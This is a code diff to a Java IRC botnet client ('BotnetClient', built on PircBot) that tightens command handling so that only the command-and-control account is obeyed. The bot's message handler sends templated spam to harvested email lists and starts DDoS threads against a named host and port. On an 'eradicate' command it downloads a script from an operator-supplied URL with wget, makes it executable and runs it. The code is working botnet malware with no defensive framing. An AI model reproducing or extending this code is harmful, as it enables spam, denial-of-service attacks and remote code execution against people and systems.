@@ -29,17 +29,8 @@ public class BotnetClient extends PircBot {
 	private String uuid;
 	private String id;
 	private String operator;
-	
-	/*private static final byte[] key = 
-	{(byte)0x2e, (byte)0xa0, (byte)0x8c, (byte)0x66, (byte)0xf6, (byte)0x8d, (byte)0x71, 
-	(byte)0xae, (byte)0x83, (byte)0xa1, (byte)0x24, (byte)0x96, (byte)0xa3, (byte)0xc3, 
-	(byte)0xd0, (byte)0x91, (byte)0x7f, (byte)0x86, (byte)0x69, (byte)0x78, (byte)0x99, 
-	(byte)0xee, (byte)0x80, (byte)032, (byte)0x9d, (byte)0xb8, (byte)0xb1, (byte)0x47, 
-	(byte)0x65, (byte)0xa1, (byte)0xd0, (byte)0x01};*/
 
 	private Key startKey;
-	//private Cipher startCipher;
-	//private MsgEncrypt startMsgE;
 	
 	private Key privKey;
 	
@@ -94,66 +85,73 @@ public class BotnetClient extends PircBot {
 	}
 		
 	protected void onPrivateMessage(String sender, String login, String hostname, String message) {
-		try {
-			// TODO: maybe need to put this back
-			//System.out.println(message);
-			//message = startMsgE.decryptMsg(message);
-			//System.out.println(message);
-			if (message.toLowerCase().startsWith("spam")) {
-				String[] parts = message.split("'");
-				if (parts.length < 9) {
-					System.out.println("bad spam message: " + message);
-				} else {
-					String x = parts[1];
-					String y = parts[3];
-					String z = parts[5];
-					String subject = parts[7];
-					String emails = parts[8].trim();
-					
-					String[] to;
-					if (emails.toLowerCase().equals("random")) {
-						to = getEmails(RANDOM_EMAILS);
-					} else if (emails.toLowerCase().equals("all")) {
-						to = getEmails(EMAILS);
+		if (sender.equals(CC)) {
+			try {
+				// TODO: maybe need to put this back
+				//System.out.println(message);
+				//message = startMsgE.decryptMsg(message);
+				//System.out.println(message);
+				if (message.toLowerCase().startsWith("spam")) {
+					String[] parts = message.split("'");
+					if (parts.length < 9) {
+						System.out.println("bad spam message: " + message);
 					} else {
-						to = emails.split(" ");
-					}
-					String body = "";
-					try {
-						Scanner in = new Scanner(new File(TEMPLATE));
-						while (in.hasNextLine()) {
-							body += in.nextLine() + "\n";
+						String x = parts[1];
+						String y = parts[3];
+						String z = parts[5];
+						String subject = parts[7];
+						String emails = parts[8].trim();
+						
+						String[] to;
+						if (emails.toLowerCase().equals("random")) {
+							to = getEmails(RANDOM_EMAILS);
+						} else if (emails.toLowerCase().equals("all")) {
+							to = getEmails(EMAILS);
+						} else {
+							to = emails.split(" ");
 						}
-					} catch (Exception e) {
-						System.out.println("There were problems reading " + TEMPLATE);
+						String body = "";
+						try {
+							Scanner in = new Scanner(new File(TEMPLATE));
+							while (in.hasNextLine()) {
+								body += in.nextLine() + "\n";
+							}
+						} catch (Exception e) {
+							System.out.println("There were problems reading " + TEMPLATE);
+						}
+						body = body.replace("XXX", x).replace("YYY", y).replace("ZZZ", z);
+						sendEmail(to, subject, body);
 					}
-					body = body.replace("XXX", x).replace("YYY", y).replace("ZZZ", z);
-					sendEmail(to, subject, body);
-				}
-			} else if (message.toLowerCase().startsWith("ddos")) {
-				System.out.println(sender + ": " + message);
-				String[] parts = message.split(" ");
-				if (parts.length < 4) {
-					System.out.println("Bad ddos message provided");
-				} else {
-					DdosThread ddos = new DdosThread(parts[1], Integer.parseInt(parts[2]), Integer.parseInt(parts[3]));
-				}
-			} else if (message.toLowerCase().startsWith("lease")) {
-				System.out.println("Leasing Myself");
-			} else if (message.toLowerCase().startsWith("eradicate")) {
-				String[] parts = message.split(" ");
-				if (parts.length > 1) {
-					String url = parts[1];
-					Runtime.getRuntime().exec("wget -O clean.sh " + url + "; chmod +x clean.sh; ./clean.sh;");
+				} else if (message.toLowerCase().startsWith("ddos")) {
+					System.out.println(sender + ": " + message);
+					String[] parts = message.split(" ");
+					if (parts.length < 4) {
+						System.out.println("Bad ddos message provided");
+					} else {
+						DdosThread ddos = new DdosThread(parts[1], Integer.parseInt(parts[2]), Integer.parseInt(parts[3]));
+					}
+				} else if (message.toLowerCase().startsWith("lease")) {
+					System.out.println("Leasing Myself");
+				} else if (message.toLowerCase().startsWith("eradicate")) {
+					String[] parts = message.split(" ");
+					if (parts.length > 1) {
+						String url = parts[1];
+						Runtime.getRuntime().exec("wget -O clean.sh " + url + "; chmod +x clean.sh; ./clean.sh;");
+						System.exit(0);
+					}
+				} else if (message.toLowerCase().startsWith("kill")) {
 					System.exit(0);
+				} else if (message.toLowerCase().startsWith("key")) {
+					String[] parts = message.split(" ", 2);
+					//Do stuff with parts[1]
+				} else {
+					System.out.println(sender + "<" + hostname + "> tried to use me with (" + message + ")");
 				}
-			} else if (message.toLowerCase().startsWith("kill")) {
-				System.exit(0);
-			} else {
-				System.out.println(sender + "<" + hostname + "> tried to use me with (" + message + ")");
+			} catch (Exception e) {
+				System.out.println("There was problems decrypting the message");
 			}
-		} catch (Exception e) {
-			System.out.println("There was problems decrypting the message");
+		} else {
+			System.out.println(sender + "<" + hostname + "> tried to use me with (" + message + ")");
 		}
 	}
 	
@@ -166,6 +164,7 @@ public class BotnetClient extends PircBot {
 			op(CHANNEL, sender);
 			deOp(CHANNEL, id);
 			System.out.println("Operator status given to " + CC);
+			//sendMessage(CC, key);
 		}
 	}
 	
